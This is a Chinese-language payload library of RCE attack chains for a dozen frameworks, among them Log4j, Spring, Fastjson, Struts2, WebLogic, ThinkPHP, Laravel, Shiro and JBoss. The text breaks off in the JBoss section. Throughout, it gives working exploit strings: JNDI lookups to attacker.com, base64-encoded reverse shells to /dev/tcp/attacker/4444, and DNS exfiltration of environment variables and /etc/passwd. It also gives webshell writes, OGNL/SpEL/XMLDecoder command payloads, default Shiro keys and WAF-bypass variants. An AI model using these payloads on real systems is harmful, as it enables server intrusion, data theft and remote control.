# RCE — 框架 / 中间件漏洞 payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖 Log4j / Spring / Fastjson / Struts2 / WebLogic / ThinkPHP / Laravel / Shiro / JBoss / Tomcat / Django / Flask 等 18 个高频组件的 RCE 利用链。命中指纹后直接挑对应 H3 章节。

---

### Log4j RCE (Log4Shell)  `log4j-rce`
Apache Log4j远程代码执行漏洞
子类：**Log4j** · tags: `log4j` `rce` `cve-2021-44228` `log4shell`

**前置条件：** 使用Log4j 2.x版本；用户输入被记录到日志

**攻击链：**

**1. 1. 探测漏洞**
_探测Log4j漏洞_
```
在任意输入点注入:
${jndi:ldap://attacker.com/test}
观察是否有DNS回调
```

**2. 2. DNS外带测试**
_外带敏感信息_
```
${jndi:ldap://${env:USER}.attacker.com}
${jndi:ldap://${sys:java.version}.attacker.com}
外带环境变量或系统属性
```

**3. 3. 构造恶意LDAP服务器**
_构造RCE payload_
```
使用JNDIExploit或rogue-jndi:
java -jar JNDIExploit.jar -i attacker.com
构造payload:
${jndi:ldap://attacker.com:1389/Basic/Command/base64/d2hvYW1p}
```

**4. 4. 获取Shell**  _[linux]_
_获取反弹Shell_
```
${jndi:ldap://attacker.com:1389/Basic/Command/base64/YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjE=}
Base64解码为: bash -i >& /dev/tcp/attacker/4444 0>&1
```

**WAF/EDR 绕过变体：**

**1. 绕过关键字过滤**
_使用嵌套表达式绕过_
```
${${lower:j}ndi:ldap://attacker.com}
${${upper:j}ndi:${lower:l}dap://attacker.com}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com}
```

**2. 绕过特殊字符过滤**
_构造协议字符串_
```
${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.com}
${jndi:dns://attacker.com}
```

---

### Spring Actuator漏洞  `spring-actuator`
Spring Boot Actuator端点安全漏洞
子类：**Spring** · tags: `spring` `actuator` `rce` `java`

**前置条件：** Spring Boot应用；Actuator端点暴露

**攻击链：**

**1. 1. 探测Actuator端点**
_探测暴露的Actuator端点_
```
/actuator
/actuator/env
/actuator/health
/actuator/mappings
/actuator/configprops
/actuator/heapdump
```

**2. 2. 获取敏感信息**
_获取环境变量和配置_
```
/actuator/env
查看数据库密码、API密钥等
/actuator/configprops
查看配置属性
```

**3. 3. 下载堆转储**
_下载并分析堆转储_
```
curl -o heapdump http://target.com/actuator/heapdump
使用Memory Analyzer Tool分析
搜索password、secret等关键词
```

**4. 4. env端点RCE**
_通过env端点执行命令_
```
POST /actuator/env
Content-Type: application/x-www-form-urlencoded
spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('String exec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} return null;}')

POST /actuator/restart
```

**WAF/EDR 绕过变体：**

**1. 路径遍历与分号参数技巧**
_Spring框架的分号路径参数特性允许在URL中插入分号段绕过路径匹配规则，结合双编码和路径穿越访问被限制的Actuator端点_
```
# 分号路径参数绕过(Spring特性):
/;/actuator/env
/actuator;.js/env
/actuator/..;/actuator/env

# 双URL编码:
/%61%63%74%75%61%74%6f%72/env
/actuator/%65%6e%76

# 路径穿越:
/random/../actuator/env
/api/v1/../../actuator/heapdump
```

**2. HTTP方法覆盖与Content-Type绕过**
_使用X-HTTP-Method-Override头覆盖请求方法，或通过非标准Content-Type和大小写变体绕过WAF对Actuator端点的POST请求拦截_
```
# HTTP方法覆盖:
GET /actuator/env HTTP/1.1
X-HTTP-Method-Override: POST

# Content-Type绕过:
POST /actuator/env HTTP/1.1
Content-Type: application/x-www-form-urlencoded
spring.cloud.bootstrap.location=http://attacker.com/payload.yml

# 大小写绕过:
/Actuator/Env
/ACTUATOR/ENV
```

---

### Fastjson RCE  `fastjson-rce`
Alibaba Fastjson反序列化远程代码执行
子类：**Fastjson** · tags: `fastjson` `rce` `deserialization` `java`

**前置条件：** 使用Fastjson库；存在反序列化点

**攻击链：**

**1. 1. 探测Fastjson**
_探测Fastjson版本_
```
发送JSON请求，观察响应:
{"@type":"java.net.Inet4Address","val":"attacker.com"}
观察是否有DNS回调
```

**2. 2. JNDI注入**
_JNDI注入RCE_
```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}
```

**3. 3. 搭建恶意服务**
_搭建恶意LDAP/RMI服务_
```
使用JNDIExploit:
java -jar JNDIExploit.jar -i attacker.com
或使用marshalsec:
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#Exploit 1389
```

**4. 4. 绕过AutoType检查**
_绕过AutoType黑名单_
```
1.2.47版本绕过:
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}}
```

**WAF/EDR 绕过变体：**

**1. Unicode编码与嵌套JSON绕过**
_通过Unicode(\u0040)、十六进制(\x40)编码@type字段名或嵌套JSON结构绕过WAF对Fastjson特征的检测_
```
# Unicode编码@type:
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}

# 十六进制编码:
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}

# 嵌套JSON混淆:
{"a":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}}
```

**2. BCEL ClassLoader与版本特异链**
_针对不同Fastjson版本使用特异性利用链：BCEL ClassLoader加载字节码、1.2.47缓存投毒、1.2.68 expectClass白名单绕过_
```
# BCEL ClassLoader(Fastjson 1.1.15-1.2.24):
{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader","":"$$BCEL$$$l$8b..."}

# Fastjson 1.2.47 AutoType绕过:
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}}

# Fastjson 1.2.68 expectClass绕过:
{"@type":"java.lang.AutoCloseable","@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
```

---

### Spring SpEL注入  `spring-spel`
Spring表达式语言注入攻击
子类：**Spring SpEL** · tags: `spring` `spel` `expression` `rce`

**前置条件：** 使用Spring框架；存在SpEL注入点

**攻击链：**

**1. 1. 探测SpEL注入**
_探测SpEL注入点_
```
# 测试表达式执行
${7*7}
#{7*7}
${T(java.lang.Runtime).getRuntime()}

# 观察响应
# 如果返回49或执行成功则存在漏洞
```

**2. 2. 命令执行**
_执行系统命令_
```
# Runtime执行命令
${T(java.lang.Runtime).getRuntime().exec("id")}
#{T(java.lang.Runtime).getRuntime().exec("whoami")}

# ProcessBuilder
${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
#{new java.lang.ProcessBuilder(new String[]{"cmd","/c","whoami"}).start()}

# 反弹Shell
${T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}
```

**3. 3. 文件读取**
_读取敏感文件_
```
# 读取文件
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("cat /etc/passwd").getInputStream())}

# 使用Scanner
#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("cat /etc/passwd").getInputStream()).useDelimiter("\\A").next()}

# 直接读取
${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get("/etc/passwd"))}
```

**4. 4. DNS外带**
_DNS外带数据_
```
# DNS外带数据
${T(java.net.InetAddress).getByName("attacker.com")}

# 外带文件内容
${T(java.net.InetAddress).getByName(T(java.lang.String).valueOf(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get("/etc/passwd"))).substring(0,20)+".attacker.com")}
```

**WAF/EDR 绕过变体：**

**1. 字符串拼接**
_字符串拼接绕过_
```
# 绕过关键字过滤
${T(java.lang.Run"+"time).getRun"+"time().exec("id")}
#{T(String).getClass().forName("java.la"+"ng.Runtime").getMethod("exec",T(String)).invoke(T(String).getClass().forName("java.la"+"ng.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

**2. 反射绕过**
_反射绕过_
```
# 使用反射
#{T(Class).forName("java.lang.Runtime").getMethod("exec",T(String)).invoke(T(Class).forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}

# 使用ScriptEngine
#{T(javax.script.ScriptEngineManager).newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\"id\\")")}
```

---

### Spring Cloud漏洞  `spring-cloud`
Spring Cloud相关漏洞利用
子类：**Spring Cloud** · tags: `spring` `cloud` `rce` `deserialization`

**前置条件：** 使用Spring Cloud；存在漏洞版本

**攻击链：**

**1. 1. Spring Cloud Gateway RCE**
_Spring Cloud Gateway RCE_
```
# CVE-2022-22947
# 添加恶意路由
POST /actuator/gateway/routes/hack HTTP/1.1
Content-Type: application/json

{
  "id": "hack",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}

# 刷新路由
POST /actuator/gateway/refresh

# 查看结果
GET /actuator/gateway/routes/hack
```

**2. 2. Spring Cloud Function SpEL**
_Spring Cloud Function SpEL注入_
```
# CVE-2022-22963
# 修改请求头触发SpEL
POST /functionRouter HTTP/1.1
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("id")
Content-Type: text/plain

payload
```

**3. 3. Spring Cloud Netflix**
_Spring Cloud Netflix漏洞_
```
# CVE-2020-5410 目录遍历
GET /..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd

# Eureka Server SSRF
POST /eureka/apps
# 配置serviceUrl指向内网服务
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_编码绕过_
```
# URL编码绕过
..%252f = ..%2f = ../

# 双重URL编码
..%252f..%252f
```

---

### Struts2远程代码执行  `struts2-rce`
Apache Struts2框架RCE漏洞
子类：**Struts2** · tags: `struts2` `rce` `java` `apache`

**前置条件：** 使用Struts2框架；存在漏洞版本

**攻击链：**

**1. 1. S2-045漏洞**
_S2-045 Content-Type注入_
```
# CVE-2017-5638
# Content-Type头注入
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

**2. 2. S2-046漏洞**
_S2-046 Content-Disposition注入_
```
# CVE-2017-5638
# Content-Disposition注入
Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','vulnerable')}"

# 完整RCE
Content-Disposition: form-data; name="upload"; filename="%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='id').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
```

**3. 3. S2-057漏洞**
_S2-057 URL命名空间注入_
```
# CVE-2018-11776
# URL命名空间注入
http://target/${(111+111)}/test.action
# 如果返回222则存在漏洞

# RCE
http://target/${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='id').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}/test.action
```

**4. 4. S2-061/S2-062漏洞**
_S2-061/062 OGNL注入_
```
# CVE-2020-17530
# OGNL表达式注入
POST /action HTTP/1.1
Content-Type: application/x-www-form-urlencoded

id=%25%7b%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS.%40java.lang.Runtime%40getRuntime().exec(%27id%27)%7d

# 解码后
id=%{#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS.@java.lang.Runtime@getRuntime().exec('id')}
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_编码绕过_
```
# URL编码
%{#cmd} = %25%7b%23cmd%7d

# Unicode编码
\u0025{#cmd}

# 双重编码
%2525%257b%2523cmd%257d
```

**2. 表达式变体**
_表达式变体绕过_
```
# 不同表达式语法
${...}
%{...}
#{...}
@{...}

# 使用静态方法
@java.lang.Runtime@getRuntime()
new java.lang.ProcessBuilder()
```

---

### Struts2 OGNL表达式注入  `struts2-ognl`
Struts2 OGNL表达式注入技术详解
子类：**Struts2 OGNL** · tags: `struts2` `ognl` `expression` `injection`

**前置条件：** 使用Struts2框架；存在OGNL注入点

**攻击链：**

**1. 1. OGNL基础语法**
_OGNL基础语法_
```
# 访问对象属性
#object.property
#object['property']

# 调用方法
#object.method()
#object.method(arg1, arg2)

# 静态方法调用
@package.ClassName@method()
@java.lang.Runtime@getRuntime()

# 创建对象
new java.lang.String("test")
new java.lang.ProcessBuilder(new String[]{"id"})
```

**2. 2. 绕过安全限制**
_绕过安全限制_
```
# 获取DEFAULT_MEMBER_ACCESS
#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS

# 设置成员访问权限
#_memberAccess=#dm

# 清除排除类
#ognlUtil.getExcludedClasses().clear()
#ognlUtil.getExcludedPackageNames().clear()

# 完整绕过
(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))
```

**3. 3. 命令执行技巧**
_命令执行技巧_
```
# 使用Runtime
#cmd='id'
#cmds={'/bin/bash','-c',#cmd}
#p=new java.lang.ProcessBuilder(#cmds)
#process=#p.start()

# 获取输出
#is=#process.getInputStream()
#ros=@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()
@org.apache.commons.io.IOUtils@copy(#is,#ros)

# 字符串输出
@org.apache.commons.io.IOUtils@toString(#process.getInputStream())
```

**4. 4. 文件操作**
_文件操作_
```
# 读取文件
new java.util.Scanner(new java.io.File("/etc/passwd")).useDelimiter("\\A").next()

# 写入文件
new java.io.FileOutputStream("shell.jsp").write(new sun.misc.BASE64Decoder().decodeBuffer("BASE64_SHELL").getBytes())

# 列出目录
new java.io.File("/").list()
```

**WAF/EDR 绕过变体：**

**1. 字符编码绕过**
_字符编码绕过_
```
# Unicode编码
\u0069d = id
\u0027 = '

# 十六进制
\x69\x64 = id

# 字符串拼接
"i"+"d" = "id"
'id'.substring(0,2)
```

**2. 反射绕过**
_反射绕过_
```
# 使用反射调用
#cls=@java.lang.Class@forName("java.lang.Runtime")
#method=#cls.getMethod("getRuntime")
#rt=#method.invoke(null)
#exec=#cls.getMethod("exec",@java.lang.String@class)
#exec.invoke(#rt,"id")
```

---

### WebLogic远程代码执行  `weblogic-rce`
Oracle WebLogic Server RCE漏洞
子类：**WebLogic** · tags: `weblogic` `rce` `java` `oracle`

**前置条件：** 使用WebLogic Server；存在漏洞版本

**攻击链：**

**1. 1. CVE-2017-10271**
_CVE-2017-10271 XMLDecoder_
```
# XMLDecoder反序列化
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>id</string></void>
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```

**2. 2. CVE-2019-2725**
_CVE-2019-2725 AsyncResponseService_
```
# 新版XMLDecoder绕过
POST /_async/AsyncResponseService HTTP/1.1
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing">
  <soapenv:Header>
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>id</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```

**3. 3. CVE-2020-14882**
_CVE-2020-14882 Console RCE_
```
# 未授权访问+命令执行
# 登录绕过
GET /console/css/%252e%252e%252fconsole.portal HTTP/1.1

# 命令执行
GET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27id%27);%22) HTTP/1.1
```

**WAF/EDR 绕过变体：**

**1. 路径编码绕过**
_路径编码绕过_
```
# 不同编码方式
/console/css/..;/console.portal
/console/css/%2e%2e/console.portal
/console/css/%252e%252e/console.portal
/console/css/..%252fconsole.portal
```

**2. XML变体**
_XML变体绕过_
```
# 使用不同XML标签
<void class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<string>id</string>
</void>
</void>

# 使用数组形式
<array class="java.lang.String" length="1">
<void index="0"><string>id</string></void>
</array>
```

---

### WebLogic T3协议攻击  `weblogic-t3`
WebLogic T3协议反序列化漏洞
子类：**WebLogic T3** · tags: `weblogic` `t3` `deserialization` `java`

**前置条件：** WebLogic开放T3端口；存在漏洞版本

**攻击链：**

**1. 1. 探测T3服务**
_探测T3服务_
```
# 扫描T3端口(默认7001)
nmap -sV -p 7001 target

# T3握手
echo "t3 12.2.1" | nc target 7001

# 如果返回HELO则存在T3服务
```

**2. 2. 使用工具攻击**
_使用工具攻击_
```
# 使用weblogic_exploit
git clone https://github.com/0xn0ne/weblogicScanner
cd weblogicScanner
python3 weblogic.py -t target -p 7001

# 使用WebLogicTool
java -jar WebLogicTool.jar -target target:7001 -cmd "id"

# 使用ysoserial
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections1 "touch /tmp/pwned"
```

**3. 3. 构造恶意T3请求**
_构造恶意T3请求_
```
# Python脚本构造T3请求
import socket
import struct

def send_t3_payload(target, port, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, port))
    
    # T3握手
    sock.send(b"t3 12.2.1\n")
    response = sock.recv(1024)
    
    # 发送恶意序列化对象
    # 构造包含恶意对象的T3请求
    sock.send(payload)
    sock.close()

# 使用ysoserial生成payload
# java -jar ysoserial.jar CommonsCollections1 "id" > payload.bin
```

**WAF/EDR 绕过变体：**

**1. Gadget链选择**
_Gadget链选择_
```
# 不同Gadget链
CommonsCollections1
CommonsCollections2
CommonsCollections3
CommonsCollections4
CommonsBeanutils1
Jdk7u21
Jre8u20

# 根据目标环境选择合适的链
```

---

### WebLogic IIOP协议攻击  `weblogic-iiop`
WebLogic IIOP协议反序列化漏洞
子类：**WebLogic IIOP** · tags: `weblogic` `iiop` `deserialization` `corba`

**前置条件：** WebLogic开放IIOP端口；存在漏洞版本

**攻击链：**

**1. 1. 探测IIOP服务**
_探测IIOP服务_
```
# 扫描IIOP端口	nmap -sV -p 7001 target

# IIOP使用相同端口
# 检测是否支持IIOP
# 使用工具检测
```

**2. 2. CVE-2020-2551**
_CVE-2020-2551利用_
```
# 使用weblogic_CVE_2020_2551
git clone https://github.com/Y4er/CVE-2020-2551
cd CVE-2020-2551

# 编译并运行
mvn package
java -jar target/CVE-2020-2551-1.0-SNAPSHOT.jar target 7001

# 使用JRMP监听
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}"
```

**3. 3. 构造IIOP请求**
_构造IIOP请求_
```
# 使用Python构造
# 需要安装相关库
pip install idna

# 使用JNDI注入
# 构造恶意JNDI引用
String jndiURL = "iiop://attacker:1099/Exploit";
Context ctx = new InitialContext();
ctx.lookup(jndiURL);

# 使用JNDIExploit工具
java -jar JNDIExploit.jar -i attacker_ip
```

**WAF/EDR 绕过变体：**

**1. 协议切换**
_协议切换绕过_
```
# 在T3和IIOP之间切换
# 如果T3被禁用，尝试IIOP
# 使用不同协议绕过检测
```

---

### ThinkPHP远程代码执行  `thinkphp-rce`
ThinkPHP框架RCE漏洞
子类：**ThinkPHP** · tags: `thinkphp` `rce` `php` `framework`

**前置条件：** 使用ThinkPHP框架；存在漏洞版本

**攻击链：**

**1. 1. ThinkPHP 5.x RCE**
_ThinkPHP 5.0.x RCE_
```
# ThinkPHP 5.0.x RCE
# 方法调用
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1

# 写入WebShell
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php eval($_POST[cmd]);?>

# 执行系统命令
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```

**2. 2. ThinkPHP 5.1.x RCE**
_ThinkPHP 5.1.x RCE_
```
# ThinkPHP 5.1.x RCE
?s=index/think\Request/input&filter[]=system&data=id
?s=index/think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/think\Template/driver/file/write&cacheFile=shell.php&content=%3C%3Fphp%20eval($_POST[cmd]);%3F%3E
```

**3. 3. ThinkPHP 5.0.23 RCE**
_ThinkPHP 5.0.23 RCE_
```
# POST方法
POST /index.php?s=captcha HTTP/1.1
Content-Type: application/x-www-form-urlencoded

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id

# 写入Shell
_method=__construct&filter[]=file_put_contents&method=get&server[REQUEST_METHOD]=shell.php&get[]=<?php eval($_POST[cmd]);?>
```

**4. 4. 信息收集**
_信息收集_
```
# 获取ThinkPHP版本
# 查看响应头
X-Powered-By: ThinkPHP 5.0.x

# 访问特定页面
/index.php?s=/index/\think\app/init
/index.php?s=/index/\think\Request/input

# 错误信息泄露
# 触发错误查看版本
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_编码绕过_
```
# URL编码
?s=%2fIndex%2f%5cthink%5capp%2finvokefunction

# 大小写混合
?s=/Index/\Think\App/invokefunction

# 双重编码
?s=%252fIndex%252f%255cthink%255capp%252finvokefunction
```

**2. 路径变体**
_路径变体绕过_
```
# 不同路径格式
?s=/index/think\app/invokefunction
?s=index/think/app/invokefunction
?s=/index/\think\App/invokefunction

# 使用不同入口点
/index.php?s=...
/?s=...
/public/index.php?s=...
```

---

### Laravel远程代码执行  `laravel-rce`
Laravel框架RCE漏洞
子类：**Laravel** · tags: `laravel` `rce` `php` `framework`

**前置条件：** 使用Laravel框架；存在漏洞版本或配置

**攻击链：**

**1. 1. CVE-2021-3129**
_CVE-2021-3129 Ignition RCE_
```
# Laravel Ignition RCE
# 使用工具
git clone https://github.com/zhzyker/CVE-2021-3129
cd CVE-2021-3129
python3 exp.py -t http://target

# 手动利用
# 需要发送Phar反序列化payload
# 使用phpggc生成
phpggc Laravel/RCE1 system id > payload

# 发送请求
POST /_ignition/health-check HTTP/1.1
Content-Type: application/json

{"solution":"...","parameters":{"viewFile":"phar://..."}}
```

**2. 2. 调试模式信息泄露**
_调试模式信息泄露_
```
# APP_DEBUG=true信息泄露
# 访问触发错误的页面
# 查看堆栈跟踪中的敏感信息

# 可能泄露:
- 数据库凭证
- API密钥
- 环境变量
- 服务器路径
- 源代码片段
```

**3. 3. .env文件泄露**
_.env文件泄露_
```
# 尝试访问.env文件
GET /.env HTTP/1.1
GET /../.env HTTP/1.1
GET /public/.env HTTP/1.1

# .env文件包含:
APP_KEY=base64:...
DB_HOST=localhost
DB_DATABASE=laravel
DB_USERNAME=root
DB_PASSWORD=password
```

**4. 4. APP_KEY利用**
_APP_KEY利用_
```
# 获取APP_KEY后
# 可以伪造Cookie
# 解密加密数据

# 使用工具解密
php artisan decrypt <encrypted_value>

# 伪造管理员Cookie
# 需要了解应用加密方式
```

**WAF/EDR 绕过变体：**

**1. 路径绕过**
_路径绕过_
```
# 尝试不同路径
/.env
/.env.example
/.env.local
/.env.production
/../.env
/..%2f.env
/..%252f.env
```

---

### Apache Shiro反序列化  `shiro-deserialize`
Apache Shiro RememberMe反序列化漏洞
子类：**Apache Shiro** · tags: `shiro` `deserialization` `java` `rememberme`

**前置条件：** 使用Apache Shiro；存在漏洞版本

**攻击链：**

**1. 1. 检测Shiro**
_检测Shiro框架_
```
# 检测rememberMe Cookie
# 响应中有rememberMe=deleteMe表示使用Shiro

# 使用工具检测
git clone https://github.com/sv3nbeast/ShiroScan
cd ShiroScan
java -jar shiro_scan.jar -t http://target

# 或使用Burp插件
# ShiroScan Burp插件
```

**2. 2. 使用ysoserial生成payload**
_生成恶意payload_
```
# 生成恶意序列化对象
java -jar ysoserial.jar CommonsCollections2 "id" > payload.ser

# 使用Shiro内置密钥加密
# 默认密钥: kPH+bIxk5D2deZiIxcaaaA==

# Python加密脚本
import base64
from Crypto.Cipher import AES

def encode_rememberme(command):
    # 生成payload
    payload = os.popen(f"java -jar ysoserial.jar CommonsCollections2 \"{command}\"").read()
    
    # AES加密
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    cipher = AES.new(key, AES.MODE_CBC, iv=key)
    
    # PKCS5Padding
    pad = 16 - len(payload) % 16
    payload += bytes([pad]) * pad
    
    encrypted = cipher.encrypt(payload)
    return base64.b64encode(encrypted).decode()
```

**3. 3. 发送恶意请求**
_发送恶意请求_
```
# 使用curl
curl -H "Cookie: rememberMe=<ENCODED_PAYLOAD>" http://target

# 使用工具
git clone https://github.com/insightglacier/Shiro_exploit
cd Shiro_exploit
python3 shiro_exploit.py -t http://target -c "id"

# 使用ShiroAttack
git clone https://github.com/acgbfull/ShiroAttack
cd ShiroAttack
java -jar ShiroAttack.jar
```

**4. 4. 常见密钥列表**
_常见密钥列表_
```
# 常见Shiro密钥
kPH+bIxk5D2deZiIxcaaaA==
4AvVhmFLUs0KTA3Kprsdag==
Z3VucwAAAAAAAAAAAAAAAA==
fCq+/xW488hMTCD+cmJ3aQ==
1QWLxg+NYmxraMoxAXu/Iw==
25BsmdYwjnfcWmnhAciDDg==
2AvVhdsgUs0F8SZSnWd+Zw==
6ZmI6I2j5Y+R54aHjOqYzg==

# 尝试不同密钥
# 或爆破密钥
```

**WAF/EDR 绕过变体：**

**1. Gadget链选择**
_Gadget链选择_
```
# 不同Gadget链
CommonsCollections2
CommonsBeanutils1
Jdk7u21
JRMPClient

# 根据目标环境选择
# 某些链可能被过滤
```

**2. 密钥爆破**
_密钥爆破_
```
# 使用工具爆破密钥
git clone https://github.com/insightglacier/Shiro_exploit
python3 shiro_exploit.py -t http://target -f keys.txt

# 或使用ShiroScan
java -jar shiro_scan.jar -t http://target -f keys.txt
```

---

### JBoss漏洞利用  `jboss-vuln`
JBoss应用服务器漏洞
子类：**JBoss** · tags: `jboss` `rce` `java` `deserialization`

**前置条件：** 使用JBoss服务器；存在漏洞版本

**攻击链：**

**1. 1. JMXInvokerServlet反序列化**
_JMXInvokerServlet反序列化_
```
# CVE-2015-7501
# 发送恶意序列化对象
POST /invoker/JMXInvokerServlet HTTP/1.1
Content-Type: application/x-java-serialized-object

# 使用ysoserial生成payload
java -jar ysoserial.jar CommonsCollections1 "id" > payload.ser

# 发送
curl -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary @payload.ser http://target/invoker/JMXInvokerServlet
```

**2. 2. JMX Console部署War包**
_JMX Console部署War包_
```
# 访问JMX Console
http://target/jmx-console/

# 查找deploy方法
# 找到 jboss.system:service=MainDeployer

# 部署远程War包
# 使用deploy方法，URL参数指向恶意War
http://target/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.system:service=MainDeployer&methodName=deploy&argType=java.lang.String&arg=http://attacker/shell.war

# 访问部署的Shell
http://target/shell/cmd.jsp?cmd=id
```

**3. 3. BSHDeployer部署**
_BSHDeployer部署_
```
# 使用BeanShell部署
# 找到 jboss.scripts:service=BSHDeployer

# 执行BeanShell脚本
# 通过createScriptDeployment方法

